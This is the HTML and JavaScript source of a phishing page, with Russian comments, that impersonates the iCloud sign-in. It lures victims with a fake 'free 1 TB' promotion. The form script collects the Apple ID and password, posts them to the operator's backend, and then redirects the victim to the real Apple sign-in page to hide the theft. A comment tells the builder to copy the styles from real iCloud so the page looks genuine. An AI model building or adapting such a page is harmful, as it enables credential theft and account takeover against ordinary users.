<!-- Это файл pages/index.html (главная страница, подделка под iCloud) -->
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iCloud</title>
    <style>
        /* Стили скопируй с настоящего iCloud, чтобы глаз не резало */
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #f5f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 18px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.1);
            width: 400px;
            text-align: center;
        }
        h1 {
            font-size: 27px;
            font-weight: 400;
            color: #1d1d1f;
            margin-bottom: 30px;
        }
        .offer {
            background: linear-gradient(135deg, #0071e3, #42a5f5);
            color: white;
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 25px;
            font-size: 18px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.9; box-shadow: 0 0 15px #0071e3; }
            100% { opacity: 1; }
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #d2d2d7;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #0071e3;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 17px;
            cursor: pointer;
            margin-top: 15px;
        }
        button:hover {
            background: #0077ed;
        }
        .note {
            font-size: 12px;
            color: #86868b;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="offer">
            🎉 Бесплатно 1TB в iCloud! 🎉<br>
            Только сегодня, только для вас
        </div>
        <h1>Войдите в iCloud</h1>
        <form id="loginForm">
            <input type="email" id="username" name="username" placeholder="Apple ID" required>
            <input type="password" id="password" name="password" placeholder="Пароль" required>
            <button type="submit">Получить 1 ТБ</button>
        </form>
        <div class="note">
            Нажимая кнопку, вы соглашаетесь с условиями акции
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Отправляем данные на наш бэкенд
            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ username, password })
                });

                // Бэкенд сам перекинет на Apple
                if (response.redirected) {
                    window.location.href = response.url;
                }
            } catch (error) {
                // Если что-то пошло не так - все равно кидаем на Apple
                window.location.href = 'https://appleid.apple.com/sign-in';
            }
        });
    </script>
</body>
</html>
